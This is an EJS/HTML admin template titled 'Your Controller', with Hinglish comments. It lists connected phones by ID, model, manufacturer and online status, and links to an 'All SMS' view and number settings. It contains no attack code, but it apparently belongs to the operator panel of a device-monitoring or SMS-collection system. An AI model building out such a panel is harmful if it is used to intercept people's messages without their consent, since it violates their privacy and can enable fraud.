<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Your Controller</title>
  <link rel="stylesheet" href="/css/phon.css" />
</head>
<body>
  <nav class="header-nav">
    <div class="menu-icon">&#9776;</div>
    <h1 class="title">Admin</h1>
    <button id="logoutAllButton">
      <img src="/image/logout.png" alt="Logout">
    </button>
  </nav>
  
  <div class="nav-links">
    <a href="/api/admin/settings">Update Number</a>
    <a href="/api/notification/sms">All SMS</a>
    <a href="/api/auth/change-credentials">Password change</a>
  </div>

  <div class="dot">
    <div class="container" id="deviceContainer">
      <%
        // User mapping: uniqueid => phoneNumber (agar available)
        const userMapping = {};
        if (users && Array.isArray(users)) {
          users.forEach(user => {
            if (user.entries && user.entries.length > 0) {
              const entry = user.entries[0];
              if (entry.phoneNumber && entry.phoneNumber.trim() !== '') {
                userMapping[user.uniqueid] = entry.phoneNumber;
              }
            }
          });
        }

        // Sorting devices: Agar corresponding user ka phone number available ho, usse sort key ke roop mein use karo, warna device.brand
        const sortedDevices = devices.sort((a, b) => {
          const aKey = userMapping[a.uniqueid] ? userMapping[a.uniqueid] : a.brand;
          const bKey = userMapping[b.uniqueid] ? userMapping[b.uniqueid] : b.brand;
          return aKey.toString().localeCompare(bKey.toString());
        });
        
        sortedDevices.forEach((device, index) => {
          // Display value: agar phone number available hai, to wahi; nahi to brand
          const displayValue = userMapping[device.uniqueid] ? userMapping[device.uniqueid] : device.brand;
      %>
        <div class="device-card" data-id="<%= device.uniqueid %>">
          <div class="device-content">
            <img src="/image/style.webp" alt="User Icon" />
            <div class="device-details">
              <h2>Device <%= index + 1 %>: <%= displayValue %></h2>
              <p><strong>Unique Id :</strong> <%= device.uniqueid %></p>
              <p><strong>Model :</strong> <%= device.model %></p>
              <p><strong>Manufacturer :</strong> <%= device.manufacturer %></p>
            </div>
          </div>
          <div class="device-status <%= device.connectivity === 'Online' ? 'status-online' : 'status-offline' %>">
            Status - <%= device.connectivity === 'Online' ? 'Online' : 'Offline' %>
          </div>
        </div>
      <% }); %>
    </div>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script src="/js/script.js"></script>
  <!-- External JS for logout functionality -->
  <script src="/js/logout.js"></script>
</body>
</html>
